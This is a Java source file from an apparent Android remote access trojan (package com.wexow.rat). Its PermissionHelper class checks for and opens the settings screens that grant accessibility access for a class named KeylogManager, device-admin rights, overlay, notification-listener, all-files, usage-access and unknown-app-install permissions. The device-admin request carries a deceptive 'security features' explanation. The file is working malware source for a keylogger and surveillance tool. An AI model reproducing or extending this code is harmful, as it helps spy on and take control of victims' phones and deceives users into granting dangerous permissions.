package com.wexow.rat.permissions;

import android.app.AppOpsManager;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.net.Uri;
import android.os.Build;
import android.os.Environment;
import android.os.PowerManager;
import android.os.Process;
import android.provider.Settings;

import com.wexow.rat.admin.AdminReceiver;
import com.wexow.rat.KeylogManager;

public class PermissionHelper {

    // ===== Accessibility =====
    public static boolean isAccessibilityEnabled(Context ctx) {
        try {
            String enabled = Settings.Secure.getString(
                ctx.getContentResolver(),
                Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES);
            if (enabled == null) return false;
            return enabled.contains(ctx.getPackageName() + "/" + KeylogManager.class.getName());
        } catch (Exception e) { return false; }
    }

    public static void openAccessibility(Context ctx) {
        try {
            Intent i = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
            i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            ctx.startActivity(i);
        } catch (Exception ignored) {}
    }

    // ===== Notification Listener =====
    public static boolean isNotificationListenerEnabled(Context ctx) {
        try {
            String enabled = Settings.Secure.getString(
                ctx.getContentResolver(), "enabled_notification_listeners");
            if (enabled == null) return false;
            return enabled.contains(ctx.getPackageName());
        } catch (Exception e) { return false; }
    }

    public static void openNotificationListener(Context ctx) {
        try {
            Intent i = new Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS");
            i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            ctx.startActivity(i);
        } catch (Exception e) {
            Intent i = new Intent(Settings.ACTION_SETTINGS);
            i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            ctx.startActivity(i);
        }
    }

    // ===== Device Admin =====
    public static boolean isDeviceAdmin(Context ctx) {
        try {
            DevicePolicyManager dpm = (DevicePolicyManager)
                ctx.getSystemService(Context.DEVICE_POLICY_SERVICE);
            ComponentName cn = new ComponentName(ctx, AdminReceiver.class);
            return dpm != null && dpm.isAdminActive(cn);
        } catch (Exception e) { return false; }
    }

    public static void openDeviceAdmin(Context ctx) {
        try {
            ComponentName cn = new ComponentName(ctx, AdminReceiver.class);
            Intent i = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
            i.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, cn);
            i.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION,
                "required to activate security features");
                
            i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            ctx.startActivity(i);
        } catch (Exception ignored) {}
    }

    // ===== Overlay =====
    public static boolean canDrawOverlays(Context ctx) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            return Settings.canDrawOverlays(ctx);
        }
        return true;
    }

    public static void openOverlay(Context ctx) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            try {
                Intent i = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                    Uri.parse("package:" + ctx.getPackageName()));
                i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                ctx.startActivity(i);
            } catch (Exception ignored) {}
        }
    }

    // ===== Battery =====
    public static boolean isIgnoringBatteryOptimizations(Context ctx) {
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                PowerManager pm =
                    (PowerManager) ctx.getSystemService(Context.POWER_SERVICE);
                return pm != null &&
                    pm.isIgnoringBatteryOptimizations(ctx.getPackageName());
            }
            return true;
        } catch (Exception e) { return false; }
    }

    public static void openBatteryOptimization(Context ctx) {
        try {
            Intent i = new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS,
                Uri.parse("package:" + ctx.getPackageName()));
            i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            ctx.startActivity(i);
        } catch (Exception e) {
            try {
                Intent i = new Intent(Settings.ACTION_IGNORE_BATTERY_OPTIMIZATION_SETTINGS);
                i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                ctx.startActivity(i);
            } catch (Exception ignored) {}
        }
    }

    // ===== Install Unknown Apps =====
    public static boolean canInstallPackages(Context ctx) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            return ctx.getPackageManager().canRequestPackageInstalls();
        }
        return true;
    }

    public static void openInstallUnknownApps(Context ctx) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            try {
                Intent i = new Intent(Settings.ACTION_MANAGE_UNKNOWN_APP_SOURCES,
                    Uri.parse("package:" + ctx.getPackageName()));
                i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                ctx.startActivity(i);
            } catch (Exception ignored) {}
        }
    }

    // ===== All Files Access =====
    public static boolean hasAllFilesAccess(Context ctx) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            return Environment.isExternalStorageManager();
        }
        return true;
    }

    public static void openAllFilesAccess(Context ctx) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            try {
                Intent i = new Intent(
                    Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION,
                    Uri.parse("package:" + ctx.getPackageName()));
                i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                ctx.startActivity(i);
            } catch (Exception e) {
                Intent i = new Intent(Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION);
                i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                ctx.startActivity(i);
            }
        }
    }

    // ===== Usage Access =====
    public static boolean hasUsageAccess(Context ctx) {
        try {
            AppOpsManager aom = (AppOpsManager)
                ctx.getSystemService(Context.APP_OPS_SERVICE);
            int mode = aom.checkOpNoThrow(
                AppOpsManager.OPSTR_GET_USAGE_STATS,
                Process.myUid(), ctx.getPackageName());
            return mode == AppOpsManager.MODE_ALLOWED;
        } catch (Exception e) { return false; }
    }

    public static void openUsageAccess(Context ctx) {
        try {
            Intent i = new Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS);
            i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            ctx.startActivity(i);
        } catch (Exception ignored) {}
    }
}
